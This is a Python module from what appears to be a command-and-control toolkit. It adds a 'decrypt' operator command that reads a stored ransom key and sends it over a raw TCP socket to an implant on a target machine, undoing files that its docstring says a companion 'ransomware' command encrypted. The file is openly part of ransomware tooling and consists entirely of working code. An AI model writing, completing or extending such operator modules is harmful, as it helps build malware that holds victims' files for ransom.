from ..commands import Command
import socket
import os

TARGET_PORT = 5050
KEY_FILE = "ransom.key"


def send_command(target: str, command: str) -> str:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((target, TARGET_PORT))
        s.sendall(command.encode("utf-8"))
        return s.recv(4096).decode("utf-8", errors="replace")


def decrypt_files(target: str, directory: str) -> None:
    if not os.path.exists(KEY_FILE):
        print(f"[-] {KEY_FILE} not found. Run ransomware first.")
        return

    with open(KEY_FILE, "r") as f:
        key = f.read().strip()

    print(f"[*] Sending decryption command for: {directory}")
    response = send_command(target, f"run_decrypt {directory} {key}")
    print(f"[+] {response}")


class decrypt(Command):
    """
    Decrypt files previously encrypted by the ransomware command.
    Usage: decrypt <target> <directory>
    """
    def do_command(self, lines: str):
        parts = lines.split()
        if len(parts) < 2:
            print("Usage: decrypt <target> <directory>")
            return
        decrypt_files(parts[0], parts[1])


command = decrypt